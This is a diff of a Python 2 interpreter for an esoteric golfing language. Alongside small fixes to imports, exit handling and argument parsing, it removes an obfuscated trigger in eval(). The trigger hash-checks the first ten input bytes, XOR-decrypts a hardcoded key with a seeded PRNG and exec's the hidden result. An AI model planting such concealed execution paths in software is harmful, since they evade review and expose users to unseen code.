@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- encoding: utf-8 -*-
-import traceback, argparse, readline, hashlib, binascii, random
+import traceback, argparse, readline, hashlib, binascii, random, sys
 from types import *
 import commands
 
@@ -37,13 +37,6 @@ class Seriously(object):
     def eval(self, code, print_at_end=True):
         if self.hex_mode:
             code = binascii.unhexlify(code)
-        key = binascii.unhexlify('1f1733f7cc54447e9f5568e50af437ddea0039600d345af3d708f1a4dc4a40260bd39ed1')
-        if hashlib.sha256(code[:10]).hexdigest() == 'd0cedf8c945e712024b7dfd69bf504ffb3fec1232b294c5602507dbe439a57fb':
-            rnd = random.Random()
-            rnd.seed(int(binascii.hexlify(code[:10]),16))
-            lock = ''.join([chr(rnd.randrange(256)) for i in range(len(key))])
-            exec ''.join(map(lambda x,y:chr(ord(x)^ord(y)),lock,key)) in globals(),locals()
-            return
         i=0
         if self.repl_mode:
             self.code += code
@@ -137,7 +130,7 @@ def srs_repl(debug_mode=False, quiet_mode=False, hex=False):
         try:
             srs.eval(raw_input('' if quiet_mode else '>>> '))
         except EOFError:
-            exit()
+            return
         finally:
             if not quiet_mode:
                 print '\n'
@@ -158,7 +151,7 @@ if __name__ == '__main__':
     parser.add_argument("-x", "--hex", help="turn on hex mode (code is taken in hex values instead of binary bytes)", action="store_true")
     group = parser.add_mutually_exclusive_group()
     group.add_argument("-c", "--code", help="run the specified code")
-    group.add_argument("-f", "--file", help="specify an input file", type=file)
+    group.add_argument("-f", "--file", help="specify an input file", type=argparse.FileType('rb'))
     args = parser.parse_args()
     if args.code or args.file:
         srs_exec(args.debug, args.file, args.code, args.hex)
